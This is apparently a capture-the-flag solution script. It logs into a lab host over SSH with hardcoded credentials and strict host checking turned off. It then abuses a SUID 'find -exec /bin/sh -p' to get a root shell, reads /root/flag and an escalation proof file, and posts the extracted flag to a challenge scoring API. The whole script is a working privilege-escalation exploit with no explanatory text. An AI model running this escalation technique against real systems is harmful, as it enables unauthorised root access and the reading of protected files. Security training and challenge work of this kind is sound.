#!/usr/bin/env bash
set -euo pipefail

host=172.20.0.141
user=operator
password=orbit-amber-7
challenge_id=scl-challenge-frame-c8cacf
remote_cmd="find / -maxdepth 0 -exec /bin/sh -p -c 'printf \"ROOT-CONTEXT\\n\"; cat /root/flag; cat /root/.escalation-proof' \\;"

output=$(sshpass -p "$password" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  "$user@$host" "$remote_cmd")
printf '%s\n' "$output"

payload=$(OUTPUT="$output" CHALLENGE_ID="$challenge_id" python3 -c 'import json, os, re; output=os.environ["OUTPUT"]; flag=re.search(r"BSY\{[^}]+\}", output); lines=output.splitlines(); assert "ROOT-CONTEXT" in lines, "root context marker missing"; assert flag, "flag missing from root output"; assert any(line.startswith("escproof-") for line in lines), "escalation proof missing from root output"; print(json.dumps({"challenge_id": os.environ["CHALLENGE_ID"], "task_id": "task1", "flag": flag.group(0)}))')
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
